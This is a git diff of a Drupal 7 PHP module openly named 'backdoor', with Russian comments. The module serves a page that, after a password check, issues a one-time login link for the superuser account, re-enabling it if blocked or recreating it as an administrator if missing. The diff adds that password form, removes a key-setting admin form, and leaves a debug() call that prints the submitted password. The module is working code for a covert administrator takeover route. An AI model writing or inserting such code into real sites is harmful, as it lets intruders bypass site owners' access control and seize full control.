@@ -1,11 +1,5 @@
 <?php
 
-/*
- * 	Вынести настройки админки в другой файл.
- * 	Попробовать создать форму на странице со ссылкой и по условию, что пароль совпадает с заранее заданным - показать ссылку. До этого ссылка е должна покаызываться.
- * 	Попробовать параметр #after_build
- */
-
 require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
 
 function backdoor_menu() {
@@ -14,7 +8,8 @@ function backdoor_menu() {
 	$items['backdoor'] = array(
 		'title' => 'Backdoor page',
 		'description' => 'Here generating one time link for login',
-		'page callback' => 'backdoor',
+		'page callback' => 'drupal_get_form',
+		'page arguments' => array('backdoor_page_form'),
 		'access callback' => 'access_backdoor_page',
 		'type' => MENU_NORMAL_ITEM,
 	);
@@ -24,6 +19,7 @@ function backdoor_menu() {
 		'description' => 'Администрирование модуля Backdoor',
 		'page callback' => 'admin_page_backdoor',
 		'access arguments' => array('administer site configuration'),
+    'file' => 'backdoor.admin.inc',
 		'type' => MENU_NORMAL_ITEM,
 	);
 
@@ -42,81 +38,66 @@ function access_backdoor_page() {
 	}
 }
 
-function backdoor() {
-	if ($user = user_load(1)) {
+function backdoor_page_form($form, &$form_state) {
 
-		if ($user->status != 1) {
-			$user->status = 1;
-			user_save($user);
-		}
+  $form = array();
 
-		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));
+  if (empty($form_state['input']['bd_password'])) {
+    $form['bd_password'] = array(
+      '#title' => t('Введите пароль для получения ссылки'),
+      '#description' => t('После успешного ввода пароля появится ссылка'),
+      '#type' => 'password',
+      '#maxlength' => 64,
+      '#size' => 35,
+      '#required' => TRUE,
+    );
 
-	} else {
-		$pass = user_password(25);
-		$new_password = user_hash_password(trim($pass));
-		$newuser = new stdClass();
-		$newuser->uid = 1;
-		$newuser->name = 'admin';
-		$newuser->pass = $new_password;
-		$newuser->mail = 'email@example.com';
-		$newuser->init = 'email@example.com';
-		$newuser->status = 1;
-		$newuser->role = array(
-			DRUPAL_AUTHENTICATED_RID => TRUE,
-			'administrator' => TRUE,
-		);
+    $form['submit'] = array(
+      '#type' => 'submit',
+      '#value' => t('Отправить'),
+    );
 
-		drupal_write_record('users', $newuser);
-		$link = l(user_pass_reset_url($newuser), user_pass_reset_url($newuser));
-	}
+  }else {
+    if ($form_state['input']['bd_password'] == variable_get('bd_password')) {
+      if ($user = user_load(1)) {
 
-	return $link;
-}
+        if ($user->status != 1) {
+          $user->status = 1;
+          user_save($user);
+        }
 
-function admin_page_backdoor() {
-  $key = variable_get('key');
-  if(!empty($key)){
-    $pass_access = t('На этой странице нет настроек');
-  }else{
-	$pass_access = drupal_get_form('admin_backdoor_form');
-	$pass_access = drupal_render($pass_access);
+        $form['link'] = array(
+          '#markup' => l(user_pass_reset_url($user), user_pass_reset_url($user)),
+        );
+
+      } else {
+        $pass = user_password(25);
+        $new_password = user_hash_password(trim($pass));
+        $newuser = new stdClass();
+        $newuser->uid = 1;
+        $newuser->name = 'admin';
+        $newuser->pass = $new_password;
+        $newuser->mail = 'email@example.com';
+        $newuser->init = 'email@example.com';
+        $newuser->status = 1;
+        $newuser->role = array(
+          DRUPAL_AUTHENTICATED_RID => TRUE,
+          'administrator' => TRUE,
+        );
+
+        drupal_write_record('users', $newuser);
+
+        $form['link'] = array(
+          '#markup' => l(user_pass_reset_url($newuser), user_pass_reset_url($newuser)),
+        );
+
+      }
+    }
   }
-  return $pass_access;
+  debug($form_state['input']);
+  return $form;
 }
 
-function admin_backdoor_form ($form, &$form_state) {
-
-	$form = array();
-
-	$form['key'] = array(
-		'#title' => t('Ключ для входа на защищённую страницу'),
-		'#description' => t('Ключ вводится один раз, восстановить его невозможно, так что не потеряйте'),
-		'#type' => 'password',
-		'#maxlength' => 64,
-		'#size' => 35,
-		'#required' => TRUE
-	);
-
-	$form['submit'] = array(
-		'#type' => 'submit',
-		'#value' => t('Отправить'),
-	);
-
-	return $form;
-}
-
-function admin_backdoor_form_validate ($form, &$form_state){
-  $length = mb_strlen($form_state['values']['key']);
-
-  if ($length < 4){
-    form_set_error('key', t('Длинна ключа должна быть не более 4-х символов'));
-  }
-
-}
-
-function admin_backdoor_form_submit ($form, &$form_state){
-  $key = user_hash_password($form_state['values']['key']);
-  variable_set('key', $key);
-  drupal_set_message(t('Секретный ключ успешно сохранён в базу данных'));
-}
+//function backdoor_page_form_validate ($form, &$form_state){
+//  debug($form_state['values']);
+//}
